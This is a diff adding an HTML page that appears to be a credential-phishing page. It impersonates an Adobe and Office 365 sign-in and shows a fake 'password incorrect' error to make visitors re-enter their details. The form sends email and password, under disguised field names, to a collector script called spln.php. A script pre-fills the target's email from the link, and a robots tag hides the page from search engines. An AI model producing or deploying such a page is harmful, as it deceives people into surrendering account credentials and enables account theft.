@@ -1,0 +1,65 @@
+<!DOCTYPE html> 
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	
+	<title>Author guidelines  | Adobe Developer Connection</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" href="./do/index.css">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="ROBOTS" content="NOINDEX, NOFOLLOW"> 
+	  <script src="js/jquery.min.js"></script>
+  <script src="js/bootstrap.min.js"></script> 
+	<link rel="shortcut icon" href="https://blobs.officehome.msocdn.com/images/content/images/favicon-8f211ea639.ico">
+</head>
+<body>
+	<div class="image-blur"></div>
+	<div class="overlay"></div>
+	<div class="login">
+		<div class="box">
+			<div class="idp-flow-header">
+				<img src="do/gtts.PNG" alt="Office-365">
+			</div>
+			
+			<br>
+				<font size="2.5" color="red">Your email or password is incorrect</font>
+			<h1 class="page-title"><font size="3" color="red">Sign in with a valid password to continue</font></h1>
+			<form class="abode-login" action="spln.php" method="post">
+				<div class="inputs">
+					<div class="loader ball-beat"><div></div><div></div><div></div></div>
+					<input type="email" name="vision" id="email" placeholder="Email Adress" required="" style="border: solid 1px red;">
+					<input type="password" name="dream" id="password" placeholder="Password" required="" style="border: solid 1px red;" autofocus="">
+				</div>
+				<div class="mod-form-button">
+					<input type="submit" class="mod-main" name="idinri" id="adobe-login" value="Review Document">
+				</div>
+			</form>
+		</div>
+	</div>
+	
+	
+	
+<script>
+    
+$.urlParam = function(email){
+    var results = new RegExp('[\?&]' + email + '=([^&#]*)').exec(window.location.href);
+    return results[1] || 0;
+	
+      
+}
+
+</script>
+
+
+
+<script>
+    
+    $( document ).ready(function() {
+        // after the page elements are all loaded, then run the script
+        // Set the input field with unique ID #email to a value
+
+          $("#email").val($.urlParam('email'));
+        
+        });
+        
+</script>
+
+</body></html>
